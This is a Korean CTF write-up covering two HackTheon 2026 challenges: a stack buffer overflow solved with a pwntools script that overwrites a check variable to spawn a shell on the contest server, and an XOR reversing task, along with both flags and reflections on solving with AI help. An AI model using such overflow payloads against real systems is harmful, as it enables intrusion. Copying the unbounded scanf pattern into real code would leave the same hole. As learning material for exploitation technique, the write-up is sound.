---
title: 2026 핵테온 세종 Write-Up
date: 2026-04-28 14:49:00 +0900
categories: [CTF/Wargame]
tags: [CTF]
---
## 대회 일정
2026 . 04 . 25 (토) 10:00:00 ~ 17:00:00 (7hous)

## Immutable
![image1](/assets/images/26HackTheon//1.png)
### 바이너리 분석

#### 소스 추정 (디스어셈블리 기반)

```c
// prob.c (추정)
#include <stdio.h>
#include <stdlib.h>

int main() {
    char buf[0x88];   // rbp-0x90
    int  check;       // rbp-0x10  ← buf 끝에서 0x80 바이트 위

    setvbuf(stdin,  NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("Give me a input: ");
    scanf("%s", buf);           // ← 길이 제한 없음!

    if (check == 0xdeadbeef) {
        puts("You win!");
        system("/bin/sh");      // ← 목표
    } else {
        puts("You lose..");
    }
    return 0;
}
```

#### 스택 레이아웃

```
rbp - 0x90  ← buf[0]  (scanf 시작점)
    ...
rbp - 0x10  ← check   (여기를 0xdeadbeef로 덮어야 함)
rbp - 0x08  ← stack canary
rbp + 0x00  ← saved rbp
```



### 취약점

`scanf("%s", buf)` 는 입력 길이를 제한하지 않습니다.

buf 시작(`rbp-0x90`)부터 check(`rbp-0x10`)까지의 거리:

```
0x90 - 0x10 = 0x80 = 128 bytes
```

128 바이트의 패딩을 채운 뒤에 `check` 위치에 `0xdeadbeef`를 덮으면, canary를 건드리지 않고 조건 분기를 통과할 수 있습니다.

---

### Exploit

```python
from pwn import *

p = remote("13.125.202.251", 33201)

payload  = b"A" * 0x80          # buf → check 까지 패딩 (128 bytes)
payload += p32(0xdeadbeef)      # check = 0xdeadbeef (little-endian)

p.sendlineafter(b"Give me a input: ", payload)
p.interactive()
```

![image2](/assets/images/26HackTheon//2.png)

쉘을 땄으니 목록을 확인하고 flag를 출력했습니다.

![image3](/assets/images/26HackTheon//3.png)

### flag

플래그: 

`hacktheon2026{6da02392fcc8dcd715a66ed397e2e7b168179477ff5179aea4b5f47364579275bbe4b25b2dd41a40f885224364dc18a584e628c6209f61a0ed4f13d8004c3a78eef06bf4e13e1415}`

![image4](/assets/images/26HackTheon//4.png)

## Recover It!
![image5](/assets/images/26HackTheon//5.png)

### 파일 분석

```bash
file prob
```

```
prob: ELF 64-bit LSB pie executable, x86-64, not stripped
```

64비트 리눅스 ELF 실행 파일이며 심볼이 제거되지 않았습니다(`not stripped`).

---

### strings 분석

```bash
strings prob
```

주요 출력:

```
Input:
%99s
Input length mismatch!
Correct!
Wrong..
ror8
rol8
cmptable
```

`ror8`, `rol8`, `cmptable` 심볼이 수상해 보였습니다.

---

### 디스어셈블 및 디컴파일

Ghidra로 `main` 함수를 분석하면 다음과 같은 로직이 드러납니다.

```c
void main() {
    char input[100];

    printf("Input: ");
    scanf("%99s", input);

    // 길이 체크: 반드시 64자 (0x40)
    if (strlen(input) != 0x40) {
        puts("Input length mismatch!");
        return;
    }

    // XOR 변환
    for (int i = 0; i < 0x40; i++) {
        input[i] = input[i] ^ (i + 0x67);
    }

    // cmptable과 비교
    if (memcmp(input, cmptable, 0x40) == 0) {
        puts("Correct!");
    } else {
        puts("Wrong..");
    }
}
```

**핵심 포인트:**

- 입력을 64바이트로 받아 각 바이트에 `XOR (i + 0x67)` 을 적용
- 변환 결과를 바이너리에 하드코딩된 `cmptable`(64바이트)과 `memcmp`로 비교
- `ror8` / `rol8` 함수는 정의만 되어 있고 `main`에서 호출되지 않음 → **미사용 (허수)**

---

### cmptable 추출

```bash
objdump -s -j .data prob
```

```
4020 555a0a59 5f09555f 5614434a 43441114
4030 41484c1e 421a191c 1cb9e3e3 bae5e7b1
4040 b6ecbfe8 b2bdbabb eba6f3a1 f1a4a4a0
4050 f4aca0f9 ffa5a9a8 ad94c797 9791c695
```

주소 `0x4020`부터 64바이트가 `cmptable`입니다.

---

### 역산

AI 활용하여 역산 연산해줍니다.

```
input[i] ^ (i + 0x67) == cmptable[i]
→ input[i] = cmptable[i] ^ (i + 0x67)
```

**exploit code**

```python
cmptable = bytes([
    0x55, 0x5A, 0x0A, 0x59, 0x5F, 0x09, 0x55, 0x5F,
    0x56, 0x14, 0x43, 0x4A, 0x43, 0x44, 0x11, 0x14,
    0x41, 0x48, 0x4C, 0x1E, 0x42, 0x1A, 0x19, 0x1C,
    0x1C, 0xB9, 0xE3, 0xE3, 0xBA, 0xE5, 0xE7, 0xB1,
    0xB6, 0xEC, 0xBF, 0xE8, 0xB2, 0xBD, 0xBA, 0xBB,
    0xEB, 0xA6, 0xF3, 0xA1, 0xF1, 0xA4, 0xA4, 0xA0,
    0xF4, 0xAC, 0xA0, 0xF9, 0xFF, 0xA5, 0xA9, 0xA8,
    0xAD, 0x94, 0xC7, 0x97, 0x97, 0x91, 0xC6, 0x95,
])

flag = []
for i in range(0x40):
    c = cmptable[i] ^ ((i + 0x67) & 0xFF)
    flag.append(c)

print(bytes(flag).decode('latin-1'))
```

---

## 플래그

```
hacktheon2026{22c34e819d2800db605d9fdbc9ba9ab71d6b9175d6b3b016c49cd94624f545c3}
```

---

![image6](/assets/images/26HackTheon//6.png)

## 후기
&nbsp;CTF 경험이 많은 편은 아니지만 AI 활용에 대한 회의감과 고민이 있었고, 이번 CTF부터 AI를 활용하되 끌려다니지 않고 내가 푸는 것을 보조하는 데에 집중하며 진행하였다. 이전 CTF에서는 AI에 질문하고 설명을 읽지 않고 결론으로 제시된 시도해 볼 공격만 따라 하고 어떻게 실패했는지 알려주는 것을 반복하는 방식으로 진행하였지만 이번에는 AI가 보여준 설명 전부를 읽고 시도를 해볼 때 제가 생각한 접근 방식도 첨언하여 질문하였다.  
&nbsp;CTF 참여 방식을 바꾼 후 느낀 점은 본인의 지식이 많이 부족하다는 것이다. AI가 제시해 준 설명 중 모르는 부분이 굉장히 많아 이해하는데 시간이 오래 걸렸다. 그럼에도 불구하고 읽고 나서 생각난 접근법을 제시해 주니 예전보다 수월하게 문제가 풀렸던 것 같다. 지식이 부족하여 시간이 오래 걸린 관계로 적용해 볼 수 있었던 문제가 많진 않았지만 이전과 달리 스스로의 실력이 늘고 있다는 느낌을 받았다. 앞으로도 이런 방식으로 CTF에 참여하여 AI에 끌려다니는 해커가 아니라 AI를 활용하는 해커가 되도록 노력하려 한다.

긴 글을 읽어주셔서 감사합니다. 